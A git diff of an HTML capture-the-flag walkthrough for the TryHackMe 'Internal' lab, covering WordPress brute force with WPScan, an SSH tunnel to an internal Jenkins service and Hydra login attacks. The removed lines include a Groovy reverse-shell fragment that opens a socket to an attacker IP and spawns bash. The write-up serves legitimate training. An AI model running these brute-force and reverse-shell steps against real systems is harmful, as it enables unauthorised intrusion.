@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Internal Writeup | Mohd Faiz</title>
+    <title>Internal Walkthrough | Mohd Faiz</title>
     <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500;700&display=swap" rel="stylesheet">
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; }
@@ -37,82 +37,109 @@
         <a href="../index.html#labs" class="back-btn">&lt;-- Back to Labs</a>
         
         <div class="header">
-            <h1>TryHackMe: Internal Walkthrough</h1>
+            <h1>🧠 TryHackMe – Internal</h1>
             <div class="meta">
-                <span>Target IP: <code>10.10.211.23</code></span>
+                <span>Machine Name: Internal</span>
                 <span>Difficulty: Hard</span>
-                <span>Author: Mohd Faiz</span>
+                <span>Platform: TryHackMe</span>
+                <span>Type: Linux</span>
             </div>
             <div>
-                <span class="tag">WordPress</span>
+                <span class="tag">WPScan</span>
                 <span class="tag">SSH Tunneling</span>
-                <span class="tag">Jenkins Pivoting</span>
-                <span class="tag">Privilege Escalation</span>
+                <span class="tag">Jenkins Exploitation</span>
+                <span class="tag">Groovy Script</span>
             </div>
         </div>
 
         <div class="task-box">
             <div class="task-header">
-                <span>Phase 1: Recon & WordPress Exploitation</span>
+                <span>🔍 Enumeration & WordPress Attack</span>
                 <span style="color:#8b949e;">[WPScan & Theme Shell]</span>
             </div>
             <div class="task-body">
-                <p>Enumerate target services with Nmap:</p>
-                <pre><code>nmap -sC -sV -oN internal_nmap.txt 10.10.211.23</code></pre>
-                <p>Ports open: <code>22/tcp (SSH)</code> and <code>80/tcp (HTTP)</code>.</p>
+                <h3>🔹 Nmap Scan</h3>
+                <pre><code>nmap -sV &lt;IP&gt;</code></pre>
+                <p>Findings: <code>22/tcp (SSH)</code>, <code>80/tcp (HTTP)</code></p>
 
-                <p>Run Gobuster directory enumeration:</p>
-                <pre><code>gobuster dir -u http://10.10.211.23/ -w /usr/share/wordlists/dirb/common.txt</code></pre>
-                <p>Discovers <code>/blog</code> hosting a WordPress installation.</p>
+                <h3>🌐 Web Enumeration</h3>
+                <pre><code>gobuster dir -u http://&lt;IP&gt; -w /usr/share/wordlists/dirb/common.txt</code></pre>
+                <p>Discovered Directories: <code>/blog/</code>, <code>/phpmyadmin/</code>, <code>/wordpress/</code></p>
 
-                <h3>WPScan Brute Force:</h3>
-                <pre><code>wpscan --url http://10.10.211.23/blog -U admin -P /usr/share/wordlists/rockyou.txt</code></pre>
-                <p>Credentials cracked: <code>admin : my2cents</code></p>
+                <h3>🔹 WordPress Analysis</h3>
+                <ul>
+                    <li>Found user: <code>admin</code></li>
+                    <li>Login page: <code>http://&lt;IP&gt;/blog/wp-login.php</code></li>
+                </ul>
 
-                <p>Log in, update theme template <code>404.php</code> with PHP reverse shell, trigger it, and spawn initial access as <code>www-data</code>.</p>
-                <div class="flag-box">
-                    User Flag (/home/aubreyt/user.txt): THM{4226d9ec4f51e1823d4218f2d573c52a}
-                </div>
+                <h3>🔐 Brute Force Attack (WPScan)</h3>
+                <pre><code>wpscan --url http://&lt;IP&gt;/blog -U admin -P /usr/share/wordlists/rockyou.txt</code></pre>
+                <p>Credentials Found: <code>admin : my2boys</code></p>
+
+                <h3>💣 Initial Access</h3>
+                <ul>
+                    <li>Logged into WordPress dashboard.</li>
+                    <li>Identified Theme Editor vulnerability.</li>
+                    <li>Injected reverse shell to gain initial low-privilege access.</li>
+                </ul>
             </div>
         </div>
 
         <div class="task-box">
             <div class="task-header">
-                <span>Phase 2: Pivoting to Internal Jenkins Service</span>
-                <span style="color:#8b949e;">[SSH Port Forwarding]</span>
+                <span>🔎 Post Exploitation & Pivoting</span>
+                <span style="color:#8b949e;">[SSH Tunneling]</span>
             </div>
             <div class="task-body">
-                <p>Searching <code>/var/www/html/wordpress/</code> reveals internal credentials stored in notes: <code>aubreyt : b92a170588f96b2e3f8430e386708a9a</code>.</p>
+                <h3>🔹 Sensitive File Found</h3>
+                <p>Discovered <code>wp-save.txt</code> containing credentials:</p>
+                <pre><code>aubreanna : bub13guM!@#123</code></pre>
 
-                <p>Check listening internal services on target:</p>
-                <pre><code>netstat -tulnp</code></pre>
-                <p>Target is hosting an internal service on <code>127.0.0.1:8080</code> (Jenkins).</p>
+                <h3>🔐 SSH Access</h3>
+                <pre><code>ssh aubreanna@&lt;IP&gt;</code></pre>
+                <div class="flag-box">
+                    User Flag Found: user.txt ✅<br>
+                    Internal note found: jenkins.txt
+                </div>
 
-                <h3>Setup Local SSH Tunnel:</h3>
-                <pre><code>ssh -L 8080:127.0.0.1:8080 aubreyt@10.10.211.23</code></pre>
+                <h3>⚙️ Internal Service Enumeration</h3>
+                <p>Discovered internal Jenkins instance running on: <code>172.17.0.2:8080</code></p>
 
-                <p>Now open <code>http://127.0.0.1:8080</code> on your local computer to access the internal Jenkins portal!</p>
+                <h3>🔁 Pivoting (SSH Tunneling)</h3>
+                <pre><code>ssh -L 8080:172.17.0.2:8080 aubreanna@&lt;IP&gt;</code></pre>
+                <p>Successfully accessed Jenkins portal locally via port 8080.</p>
             </div>
         </div>
 
         <div class="task-box">
             <div class="task-header">
-                <span>Phase 3: Jenkins Exploitation to Root</span>
-                <span style="color:#8b949e;">[Groovy Script Console]</span>
+                <span>🔓 Jenkins Exploitation & Root</span>
+                <span style="color:#8b949e;">[Hydra & Groovy Script]</span>
             </div>
             <div class="task-body">
-                <p>Brute-force Jenkins login using Hydra or admin default lists -> <code>admin : admin</code>.</p>
+                <h3>🔹 Brute Force using Hydra</h3>
+                <pre><code>hydra -l admin -P rockyou.txt &lt;IP&gt; http-post-form</code></pre>
+                <p>Credentials Found: <code>admin : spongebob</code></p>
 
-                <p>Navigate to <strong>Manage Jenkins -> Script Console</strong> to execute arbitrary Groovy commands directly on host OS:</p>
-                <pre><code>String host="10.11.x.x";
-int port=5555;
-String cmd="/bin/bash";
-Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);</code></pre>
+                <h3>💥 Privilege Escalation</h3>
+                <ul>
+                    <li>Logged into Jenkins admin interface.</li>
+                    <li>Navigated to Script Console (Groovy).</li>
+                    <li>Executed reverse shell payload.</li>
+                </ul>
 
-                <p>Catch connection on Netcat listener -> Shell received as <code>root</code>!</p>
                 <div class="flag-box">
-                    Root Flag (/root/root.txt): THM{f813c0134f77a83a316b24d77d70ec9d}
+                    👑 Root Access Achieved!<br>
+                    Files Retrieved: note.txt (contained root credentials), root.txt ✅
                 </div>
+
+                <h3>🧠 Key Takeaways</h3>
+                <ul>
+                    <li>Always enumerate hidden directories</li>
+                    <li>Weak credentials = easy entry</li>
+                    <li>Internal services can be accessed via SSH tunneling</li>
+                    <li>Jenkins Script Console is a common privilege escalation vector</li>
+                </ul>
             </div>
         </div>
 
